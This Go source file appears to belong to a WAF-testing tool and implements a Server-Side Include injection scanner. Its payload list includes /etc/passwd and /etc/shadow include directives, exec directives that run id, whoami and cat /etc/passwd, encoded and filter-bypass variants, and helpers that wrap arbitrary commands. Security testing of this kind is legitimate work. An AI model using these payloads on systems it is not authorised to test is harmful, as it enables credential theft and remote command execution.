// Package ssi provides Server-Side Include (SSI) injection testing
package ssi

import (
	"context"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/waftester/waftester/pkg/attackconfig"
	"github.com/waftester/waftester/pkg/defaults"
	"github.com/waftester/waftester/pkg/finding"
	"github.com/waftester/waftester/pkg/httpclient"
	"github.com/waftester/waftester/pkg/iohelper"
)

// Config configures SSI injection testing
type Config struct {
	attackconfig.Base
	Headers map[string]string
}

// DefaultConfig returns sensible defaults
func DefaultConfig() Config {
	return Config{
		Base: attackconfig.Base{
			Concurrency: defaults.ConcurrencyMedium,
			Timeout:     httpclient.TimeoutProbing,
		},
	}
}

// Result represents an SSI injection test result
type Result struct {
	URL          string
	Parameter    string
	Payload      string
	StatusCode   int
	ResponseSize int
	Vulnerable   bool
	Evidence     string
	Severity     finding.Severity
	Timestamp    time.Time
}

// Scanner performs SSI injection testing
type Scanner struct {
	config  Config
	client  *http.Client
	results []Result
	mu      sync.RWMutex
}

// NewScanner creates a new SSI scanner
func NewScanner(config Config) *Scanner {
	if config.Concurrency <= 0 {
		config.Concurrency = defaults.ConcurrencyMedium
	}
	if config.Timeout <= 0 {
		config.Timeout = httpclient.TimeoutProbing
	}

	return &Scanner{
		config:  config,
		client:  httpclient.Default(),
		results: make([]Result, 0),
	}
}

// Scan tests a URL for SSI injection
func (s *Scanner) Scan(ctx context.Context, targetURL string, params map[string]string) ([]Result, error) {
	results := make([]Result, 0)

	for param := range params {
		for _, payload := range Payloads() {
			select {
			case <-ctx.Done():
				return results, ctx.Err()
			default:
			}

			testParams := make(map[string]string)
			for k, v := range params {
				testParams[k] = v
			}
			testParams[param] = payload

			result := s.testPayload(ctx, targetURL, param, payload, testParams)
			if result.Vulnerable {
				results = append(results, result)
				s.config.NotifyVulnerabilityFound()
			}
		}
	}

	s.mu.Lock()
	s.results = append(s.results, results...)
	s.mu.Unlock()

	return results, nil
}

// testPayload tests a single SSI payload
func (s *Scanner) testPayload(ctx context.Context, targetURL, param, payload string, params map[string]string) Result {
	result := Result{
		URL:       targetURL,
		Parameter: param,
		Payload:   payload,
		Timestamp: time.Now(),
	}

	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		return result
	}
	qs := parsedURL.Query()
	for k, v := range params {
		qs.Set(k, v)
	}
	parsedURL.RawQuery = qs.Encode()

	req, err := http.NewRequestWithContext(ctx, "GET", parsedURL.String(), nil)
	if err != nil {
		return result
	}

	for k, v := range s.config.Headers {
		req.Header.Set(k, v)
	}

	resp, err := s.client.Do(req)
	if err != nil {
		return result
	}
	defer iohelper.DrainAndClose(resp.Body)

	body, _ := iohelper.ReadBodyDefault(resp.Body)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(body)

	result.Vulnerable, result.Evidence = s.detectVulnerability(string(body), payload)
	if result.Vulnerable {
		result.Severity = finding.High
	}

	return result
}

func buildQuery(params map[string]string) string {
	vals := make(url.Values, len(params))
	for k, v := range params {
		vals.Set(k, v)
	}
	return vals.Encode()
}

// detectVulnerability checks if SSI was executed
func (s *Scanner) detectVulnerability(body, payload string) (bool, string) {
	// Check for SSI execution indicators
	indicators := []struct {
		pattern string
		desc    string
	}{
		{"root:", "Passwd file disclosure via SSI"},
		{"/bin/", "System path disclosure via SSI"},
		{"uid=", "Command execution via SSI"},
		{"DATE_LOCAL", "SSI date variable executed"},
		{"DOCUMENT_URI", "SSI document variable executed"},
		{"LAST_MODIFIED", "SSI last modified executed"},
	}

	for _, ind := range indicators {
		if strings.Contains(body, ind.pattern) {
			// Make sure payload was in request and pattern in response
			if strings.Contains(payload, "<!--#") {
				return true, ind.desc
			}
		}
	}

	// Check for error messages indicating SSI processing
	errorPatterns := []string{
		"[an error occurred while processing this directive]",
		"SSI Error",
		"mod_include error",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range errorPatterns {
		if strings.Contains(bodyLower, strings.ToLower(pattern)) {
			return true, "SSI error message: " + pattern
		}
	}

	return false, ""
}

// GetResults returns all results
func (s *Scanner) GetResults() []Result {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return append([]Result{}, s.results...)
}

// Payloads returns SSI injection payloads
func Payloads() []string {
	return []string{
		// Basic SSI includes
		`<!--#include virtual="/etc/passwd" -->`,
		`<!--#include file="/etc/passwd" -->`,
		`<!--#include virtual="/etc/shadow" -->`,

		// Command execution
		`<!--#exec cmd="id" -->`,
		`<!--#exec cmd="cat /etc/passwd" -->`,
		`<!--#exec cmd="whoami" -->`,
		`<!--#exec cmd="uname -a" -->`,
		`<!--#exec cgi="/cgi-bin/test.cgi" -->`,

		// Variable echoing
		`<!--#echo var="DATE_LOCAL" -->`,
		`<!--#echo var="DOCUMENT_URI" -->`,
		`<!--#echo var="LAST_MODIFIED" -->`,
		`<!--#echo var="QUERY_STRING_UNESCAPED" -->`,

		// Config directives
		`<!--#config errmsg="SSI_VULN_TEST" -->`,
		`<!--#config timefmt="%Y" -->`,

		// Nested/encoded
		`<!%2D%2D%23include%20virtual%3D%22/etc/passwd%22%20%2D%2D>`,
		`<![CDATA[<!--#exec cmd="id" -->]]>`,

		// Windows variants
		`<!--#include virtual="c:\\windows\\system32\\drivers\\etc\\hosts" -->`,
		`<!--#exec cmd="dir" -->`,
		`<!--#exec cmd="type c:\\windows\\win.ini" -->`,

		// Bypass attempts
		`<!--#include virtual='"/etc/passwd"' -->`,
		`<!-<!--#exec cmd="id" -->-#exec cmd="id" -->`,
	}
}

// ExecPayloads returns SSI command execution payloads
func ExecPayloads(command string) []string {
	return []string{
		`<!--#exec cmd="` + command + `" -->`,
		`<!--#exec cgi="` + command + `" -->`,
	}
}

// IncludePayloads returns SSI file include payloads
func IncludePayloads(path string) []string {
	return []string{
		`<!--#include virtual="` + path + `" -->`,
		`<!--#include file="` + path + `" -->`,
	}
}
